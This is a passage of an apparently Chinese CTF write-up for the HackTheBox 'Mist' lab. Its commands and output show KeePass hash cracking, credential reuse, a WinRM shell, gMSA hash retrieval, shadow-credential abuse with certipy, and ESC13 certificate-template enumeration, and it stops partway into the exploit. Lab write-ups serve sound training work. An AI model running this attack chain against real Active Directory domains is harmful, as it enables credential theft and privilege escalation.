<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mist-image_20022024.png"></p>
</li>
</ul>
<p>它显示了一个带有base64编码密码的<span class="exturl" data-url="aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv">Cyberchef<i class="fa fa-external-link-alt"></i></span>窗口。输入是15个字符（可以在单词”Output”上方看到），并以这14个字符开头：”UA7cpa[#1!_*ZX”</p>
<h2 id="恢复密码"><a href="#恢复密码" class="headerlink" title="恢复密码"></a>恢复密码</h2><h3 id="破解-KeePass-Master-Password"><a href="#破解-KeePass-Master-Password" class="headerlink" title="破解 KeePass Master Password"></a>破解 KeePass Master Password</h3><p>使用keepass2john从数据库生成一个hash：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mist % keepass2john sharon.kdbx | <span class="built_in">tee</span> sharon.kdbx.hash</span><br><span class="line">sharon:$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc</span><br></pre></td></tr></table></figure>

<p>使用-a 3将其传递给hashcat使用掩码模式，并给它”UA7cpa[#1!_*ZX”作为密码，其中?a表示任意字符。自动检测哈希模式找到两种可能的哈希格式，这个是13400：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat --user sharon.kdbx.hash -m 13400 -a 3 <span class="string">&#x27;UA7cpa[#1!_*ZX?a&#x27;</span></span><br><span class="line"></span><br><span class="line">UA7cpa[<span class="comment">#1!_*ZX@</span></span><br></pre></td></tr></table></figure>

<h3 id="Read-Password-from-KeePass"><a href="#Read-Password-from-KeePass" class="headerlink" title="Read Password from KeePass"></a>Read Password from KeePass</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mist % kpcli --kdb=sharon.kdbx</span><br><span class="line">Provide the master password: *************************</span><br><span class="line"></span><br><span class="line">KeePass CLI (kpcli) v3.8.1 is ready <span class="keyword">for</span> operation.</span><br><span class="line">Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a description of available commands.</span><br><span class="line">Type <span class="string">&#x27;help &lt;command&gt;&#x27;</span> <span class="keyword">for</span> details on individual commands.</span><br><span class="line"></span><br><span class="line">kpcli:/&gt; show -f <span class="string">&quot;sharon/operative account&quot;</span></span><br><span class="line"></span><br><span class="line"> Path: /sharon/</span><br><span class="line">Title: operative account</span><br><span class="line">Uname:</span><br><span class="line"> Pass: ImTiredOfThisJob:(</span><br><span class="line">  URL: https://keepass.info/</span><br><span class="line">Notes: Notes</span><br></pre></td></tr></table></figure>

<h2 id="确认user"><a href="#确认user" class="headerlink" title="确认user"></a>确认user</h2><p>回头看看Bloodhound，在”搜索”栏输入”Sha”会显示另一个账户：</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist3.png"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mist % proxychains -q netexec smb MS01 -u op_sharon.mullard -p <span class="string">&#x27;ImTiredOfThisJob:(&#x27;</span></span><br><span class="line">SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.100.101 445    MS01             [-] Error checking <span class="keyword">if</span> user is admin on 192.168.100.101: The NETBIOS connection with the remote host timed out.</span><br><span class="line">SMB         192.168.100.101 445    MS01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(</span><br><span class="line">mist % proxychains -q netexec smb DC01 -u op_sharon.mullard -p <span class="string">&#x27;ImTiredOfThisJob:(&#x27;</span></span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.100.100 445    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(</span><br><span class="line">mist % proxychains -q netexec winrm DC01 -u op_sharon.mullard -p <span class="string">&#x27;ImTiredOfThisJob:(&#x27;</span></span><br><span class="line">WINRM       192.168.100.100 5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:mist.htb)</span><br><span class="line">WINRM       192.168.100.100 5985   DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( (Pwn3d!)</span><br></pre></td></tr></table></figure>

<h2 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hhY2twbGF5ZXJzL2V2aWwtd2lucm0=">Evil-WinRM<i class="fa fa-external-link-alt"></i></span>在proxychains上可以在DC01上获得shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mist % proxychains -q evil-winrm -i DC01 -u op_sharon.mullard -p <span class="string">&#x27;ImTiredOfThisJob:(&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">mist\op_sharon.mullard</span><br></pre></td></tr></table></figure>

<h1 id="Auth-as-svc-ca"><a href="#Auth-as-svc-ca" class="headerlink" title="Auth as svc_ca$"></a>Auth as svc_ca$</h1><h2 id="Enumeration-3"><a href="#Enumeration-3" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>除了作为一个具有证书的域用户之外，op_Sharon.Mullard属于Operatives组，对该组的SVC_CA$账户具有ReadGMSAPassword权限</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist4.png"></li>
</ul>
<h2 id="Get-Password-Hash"><a href="#Get-Password-Hash" class="headerlink" title="Get Password Hash"></a>Get Password Hash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q netexec ldap DC01 -u op_sharon.mullard -p <span class="string">&#x27;ImTiredOfThisJob:(&#x27;</span> --gmsa</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAPS       192.168.100.100 636    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(</span><br><span class="line">LDAPS       192.168.100.100 636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAPS       192.168.100.100 636    DC01             Account: svc_ca$              NTLM: 07bb1cde74ed154fcec836bc1122bdcc</span><br><span class="line"></span><br><span class="line">~/hackthebox/machine/mist proxychains -q netexec smb DC01 -u <span class="string">&#x27;svc_ca$&#x27;</span> -H 07bb1cde74ed154fcec836bc1122bdcc</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.100.100 445    DC01             [+] mist.htb\svc_ca$:07bb1cde74ed154fcec836bc1122bdcc</span><br></pre></td></tr></table></figure>

<h1 id="Auth-as-svc-cabackup"><a href="#Auth-as-svc-cabackup" class="headerlink" title="Auth as svc_cabackup"></a>Auth as svc_cabackup</h1><h2 id="Enumeration-4"><a href="#Enumeration-4" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>svc_ca$帐户是证书服务组的成员，该组有另一个可以注册的证书模板，但更重要的是，它在svc_cabackup上有AddKeyCredentialLink权限：</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist5.png"></li>
</ul>
<h2 id="Add-Shadow-Credential"><a href="#Add-Shadow-Credential" class="headerlink" title="Add Shadow Credential"></a>Add Shadow Credential</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q certipy shadow auto -username <span class="string">&#x27;svc_ca$@mist.htb&#x27;</span> -hashes :07bb1cde74ed154fcec836bc1122bdcc -account svc_cabackup</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID <span class="string">&#x27;d21d6202-5d9d-d7db-8779-5b3fec4d9e11&#x27;</span></span><br><span class="line">[*] Adding Key Credential with device ID <span class="string">&#x27;d21d6202-5d9d-d7db-8779-5b3fec4d9e11&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Successfully added Key Credential with device ID <span class="string">&#x27;d21d6202-5d9d-d7db-8779-5b3fec4d9e11&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Authenticating as <span class="string">&#x27;svc_cabackup&#x27;</span> with the certificate</span><br><span class="line">[*] Using principal: svc_cabackup@mist.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;svc_cabackup.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Restoring the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Successfully restored the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span>: c9872f1bc10bdd522c12fc2ac9041b64</span><br><span class="line"></span><br><span class="line">~/hackthebox/machine/mist proxychains -q netexec smb DC01 -u <span class="string">&#x27;svc_cabackup&#x27;</span> -H c9872f1bc10bdd522c12fc2ac9041b64</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.100.100 445    DC01             [+] mist.htb\svc_cabackup:c9872f1bc10bdd522c12fc2ac9041b64</span><br></pre></td></tr></table></figure>

<h1 id="Shell-as-Administrator"><a href="#Shell-as-Administrator" class="headerlink" title="Shell as Administrator"></a>Shell as Administrator</h1><h2 id="ESC13-Background"><a href="#ESC13-Background" class="headerlink" title="ESC13 Background"></a>ESC13 Background</h2><p>在2024年2月，Spector Ops发布了一项名为<span class="exturl" data-url="aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2FkY3MtZXNjMTMtYWJ1c2UtdGVjaG5pcXVlLWZkYTQyNzJmYmQ1Mw==">ADCS ESC13滥用技术<i class="fa fa-external-link-alt"></i></span>的新研究，详细描述了另一种ADCS错误配置。这一点与具有OID组链接到AD组的保险政策的模板有关。模板有一个保险策略，该策略可以有一个指向组的链接，这样使用该证书进行身份验证的用户就可以获得一个具有该组成员资格的令牌。Spector Ops将ESC13的所需条件如下列出：</p>
<ol>
<li>主体对证书模板具有注册权限。</li>
<li>证书模板具有颁发策略扩展。</li>
<li>发布策略中有一个OID组链接到某个组。</li>
<li>证书模板中没有委托人不能满足的颁发要求。</li>
<li>证书模板定义了启用客户端认证的eku。</li>
</ol>
<h2 id="ESC13-Enumeration"><a href="#ESC13-Enumeration" class="headerlink" title="ESC13 Enumeration"></a>ESC13 Enumeration</h2><h3 id="Check-ADCSESC13-ps1"><a href="#Check-ADCSESC13-ps1" class="headerlink" title="Check-ADCSESC13.ps1"></a>Check-ADCSESC13.ps1</h3><p>有几种方法可以检查ESC13。有一个PowerShell脚本，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvbmFzQksvUG93ZXJzaGVsbC9ibG9iL21hc3Rlci9DaGVjay1BRENTRVNDMTMucHMx">Check-ADCSESC13.Ps1<i class="fa fa-external-link-alt"></i></span>就是这么设计的。上传到DC01，并运行它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; . .\Check-ADCSESC13.ps1</span><br><span class="line">Enumerating OIDs</span><br><span class="line">------------------------</span><br><span class="line">OID 14514029.01A0D91BA39F2716F6917FF97B18C130 links to group: CN=Certificate Managers,CN=Users,DC=mist,DC=htb</span><br><span class="line"></span><br><span class="line">OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029</span><br><span class="line">OID DistinguishedName: CN=14514029.01A0D91BA39F2716F6917FF97B18C130,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb</span><br><span class="line">OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029</span><br><span class="line">OID msDS-OIDToGroupLink: CN=Certificate Managers,CN=Users,DC=mist,DC=htb</span><br><span class="line">------------------------</span><br><span class="line">OID 979197.E044723721C6681BECDB4DDD43B151CC links to group: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb</span><br><span class="line"></span><br><span class="line">OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197</span><br><span class="line">OID DistinguishedName: CN=979197.E044723721C6681BECDB4DDD43B151CC,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb</span><br><span class="line">OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197</span><br><span class="line">OID msDS-OIDToGroupLink: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb</span><br><span class="line">------------------------</span><br><span class="line">Enumerating certificate templates</span><br><span class="line">------------------------</span><br><span class="line">Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb</span><br><span class="line"></span><br><span class="line">Certificate template Name: ManagerAuthentication</span><br><span class="line">OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029</span><br><span class="line">OID DistinguishedName: CN=14514029.01A0D91BA39F2716F6917FF97B18C130,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb</span><br><span class="line">OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029</span><br><span class="line">OID msDS-OIDToGroupLink: CN=Certificate Managers,CN=Users,DC=mist,DC=htb</span><br><span class="line">------------------------</span><br><span class="line">Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb</span><br><span class="line"></span><br><span class="line">Certificate template Name: BackupSvcAuthentication</span><br><span class="line">OID DisplayName: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197</span><br><span class="line">OID DistinguishedName: CN=979197.E044723721C6681BECDB4DDD43B151CC,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=mist,DC=htb</span><br><span class="line">OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.858803.979197</span><br><span class="line">OID msDS-OIDToGroupLink: CN=ServiceAccounts,OU=Services,DC=mist,DC=htb</span><br><span class="line">------------------------</span><br><span class="line">Done</span><br></pre></td></tr></table></figure>

<p>ManagerAuthentication模板可以用来在证书管理器中获得成员资格：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certificate template ManagerAuthentication may be used to obtain membership of CN=Certificate Managers,CN=Users,DC=mist,DC=htb</span><br></pre></td></tr></table></figure>

<p>另外，BackupSvcAuthentication可以用来获得ServiceAccounts中的成员资格：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certificate template BackupSvcAuthentication may be used to obtain membership of CN=ServiceAccounts,OU=Services,DC=mist,DC=htb</span><br></pre></td></tr></table></figure>

<h3 id="Bloodhound-预定义查询"><a href="#Bloodhound-预定义查询" class="headerlink" title="Bloodhound 预定义查询"></a>Bloodhound 预定义查询</h3><p>在Bloodhound-CE中有一个预定义的查询，通过转到”Cypher”，点击文件夹图标，然后向下滚动到ADCS部分的底部，找到”Enrollment rights on CertTemplates with OIDGroupLink”，可以直观地看到这一点：</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist6.png"></li>
</ul>
<p>运行它</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist7.png"></li>
</ul>
<p>在这个图中有两个OIDGroupLink链接。实际缺少的是Certificate Managers组是CA Backup组的成员，而ServiceAccounts组是Backup Operators组的成员。使用Pathfinding选项卡可以很好地显示这一点：</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist8.png"></li>
</ul>
<h3 id="更新Certipy"><a href="#更新Certipy" class="headerlink" title="更新Certipy"></a>更新Certipy</h3><p>在Certipy上也有一个pull请求<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweS9wdWxsLzE5Ng==">Adds support for ESC13 #196<i class="fa fa-external-link-alt"></i></span>，为ESC13添加检测逻辑。运行此版本确实找到了易受攻击的ESC13模板：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q certipy find -vulnerable -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -dc-ip 192.168.100.100 -stdout</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 37 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 14 enabled certificate templates</span><br><span class="line">[*] Finding issuance policies</span><br><span class="line">[*] Found 1 issuance policy</span><br><span class="line">[*] Found 2 OIDs linked to templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;mist-DC01-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;mist-DC01-CA&#x27;</span> via CSRA: Can<span class="string">&#x27;t find a valid stringBinding to connect</span></span><br><span class="line"><span class="string">[*] Trying to get CA configuration for &#x27;</span>mist-DC01-CA<span class="string">&#x27; via RRP</span></span><br><span class="line"><span class="string">[*] Got CA configuration for &#x27;</span>mist-DC01-CA<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Enumeration output:</span></span><br><span class="line"><span class="string">Certificate Authorities</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">    CA Name                             : mist-DC01-CA</span></span><br><span class="line"><span class="string">    DNS Name                            : DC01.mist.htb</span></span><br><span class="line"><span class="string">    Certificate Subject                 : CN=mist-DC01-CA, DC=mist, DC=htb</span></span><br><span class="line"><span class="string">    Certificate Serial Number           : 3BF0F0DDF3306D8E463B218B7DB190F0</span></span><br><span class="line"><span class="string">    Certificate Validity Start          : 2024-02-15 15:07:23+00:00</span></span><br><span class="line"><span class="string">    Certificate Validity End            : 2123-02-15 15:17:23+00:00</span></span><br><span class="line"><span class="string">    Web Enrollment                      : Disabled</span></span><br><span class="line"><span class="string">    User Specified SAN                  : Disabled</span></span><br><span class="line"><span class="string">    Request Disposition                 : Issue</span></span><br><span class="line"><span class="string">    Enforce Encryption for Requests     : Enabled</span></span><br><span class="line"><span class="string">    Permissions</span></span><br><span class="line"><span class="string">      Owner                             : MIST.HTB\Administrators</span></span><br><span class="line"><span class="string">      Access Rights</span></span><br><span class="line"><span class="string">        ManageCertificates              : MIST.HTB\Administrators</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Domain Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Enterprise Admins</span></span><br><span class="line"><span class="string">        ManageCa                        : MIST.HTB\Administrators</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Domain Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Enterprise Admins</span></span><br><span class="line"><span class="string">        Enroll                          : MIST.HTB\Authenticated Users</span></span><br><span class="line"><span class="string">Certificate Templates</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">    Template Name                       : ManagerAuthentication</span></span><br><span class="line"><span class="string">    Display Name                        : ManagerAuthentication</span></span><br><span class="line"><span class="string">    Certificate Authorities             : mist-DC01-CA</span></span><br><span class="line"><span class="string">    Enabled                             : True</span></span><br><span class="line"><span class="string">    Client Authentication               : True</span></span><br><span class="line"><span class="string">    Enrollment Agent                    : False</span></span><br><span class="line"><span class="string">    Any Purpose                         : False</span></span><br><span class="line"><span class="string">    Enrollee Supplies Subject           : False</span></span><br><span class="line"><span class="string">    Certificate Name Flag               : SubjectRequireCommonName</span></span><br><span class="line"><span class="string">                                          SubjectAltRequireUpn</span></span><br><span class="line"><span class="string">    Enrollment Flag                     : AutoEnrollment</span></span><br><span class="line"><span class="string">                                          PublishToDs</span></span><br><span class="line"><span class="string">                                          IncludeSymmetricAlgorithms</span></span><br><span class="line"><span class="string">    Private Key Flag                    : ExportableKey</span></span><br><span class="line"><span class="string">    Extended Key Usage                  : Server Authentication</span></span><br><span class="line"><span class="string">                                          Encrypting File System</span></span><br><span class="line"><span class="string">                                          Secure Email</span></span><br><span class="line"><span class="string">                                          Client Authentication</span></span><br><span class="line"><span class="string">    Requires Manager Approval           : False</span></span><br><span class="line"><span class="string">    Requires Key Archival               : False</span></span><br><span class="line"><span class="string">    Authorized Signatures Required      : 0</span></span><br><span class="line"><span class="string">    Validity Period                     : 99 years</span></span><br><span class="line"><span class="string">    Renewal Period                      : 6 weeks</span></span><br><span class="line"><span class="string">    Minimum RSA Key Length              : 4096</span></span><br><span class="line"><span class="string">    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029</span></span><br><span class="line"><span class="string">    Linked Groups                       : CN=Certificate Managers,CN=Users,DC=mist,DC=htb</span></span><br><span class="line"><span class="string">    Permissions</span></span><br><span class="line"><span class="string">      Enrollment Permissions</span></span><br><span class="line"><span class="string">        Enrollment Rights               : MIST.HTB\Certificate Services</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Domain Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Enterprise Admins</span></span><br><span class="line"><span class="string">      Object Control Permissions</span></span><br><span class="line"><span class="string">        Owner                           : MIST.HTB\Administrator</span></span><br><span class="line"><span class="string">        Write Owner Principals          : MIST.HTB\Domain Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Enterprise Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Administrator</span></span><br><span class="line"><span class="string">        Write Dacl Principals           : MIST.HTB\Domain Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Enterprise Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Administrator</span></span><br><span class="line"><span class="string">        Write Property Principals       : MIST.HTB\Domain Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Enterprise Admins</span></span><br><span class="line"><span class="string">                                          MIST.HTB\Administrator</span></span><br><span class="line"><span class="string">    [!] Vulnerabilities</span></span><br><span class="line"><span class="string">      ESC13                             : &#x27;</span>MIST.HTB\\Certificate Services<span class="string">&#x27; can enroll, template allows client authentication and issuance policy is linked to group [&#x27;</span>CN=Certificate Managers,CN=Users,DC=mist,DC=htb<span class="string">&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>注意下面这一行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Minimum RSA Key Length              : 4096</span><br></pre></td></tr></table></figure>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><ul>
<li>使用ManagerAuthentication模板获取svc_cabackup证书，以获得对certificate Managers组的访问权。</li>
<li>使用该证书获取Kerberos票据。</li>
<li>使用BackupSvcAuthentication模板（现在可以作为certificate Managers的成员访问它）获取svc_cabackup证书，以获得对ServiceAccounts组的访问权。</li>
